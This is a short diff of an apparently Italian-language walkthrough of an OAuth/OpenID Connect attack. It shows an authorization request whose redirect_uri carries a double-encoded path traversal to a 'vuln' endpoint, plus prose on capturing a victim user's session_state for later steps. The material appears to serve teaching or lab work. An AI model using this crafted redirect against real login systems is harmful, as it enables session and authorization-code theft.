@@ -10,13 +10,10 @@ client_id=winted-web&
 redirect_uri=
 https%3A%2F%2Flocalhost%3A4200%2Flogin%2f%252E%252E%2fvuln?
 url=http%3A%2F%2Flocalhost%3A1234&
-state=0a1aeed9-19ae-4f77-b59b-5e7bfe9c5bf6&
 response_mode=fragment&
-response_type=code&
-scope=openid&
-nonce=bbe689db-3669-44d0-8934-e224075e93a9
+response_type=code
 ```
-b9e16b48-a00a-4e7d-9f96-a1292a90e6f8
+
 - cattura e conservazione del `session_state` perché servirà nei passaggi successivi. Questo parametro rappresenta il `session_id` dell'utente vittima, in questo caso l'utente `paola`. Si noti che la parte centrale del parametro `code` coincide con il `session_state` stesso. 
 
 ```shell
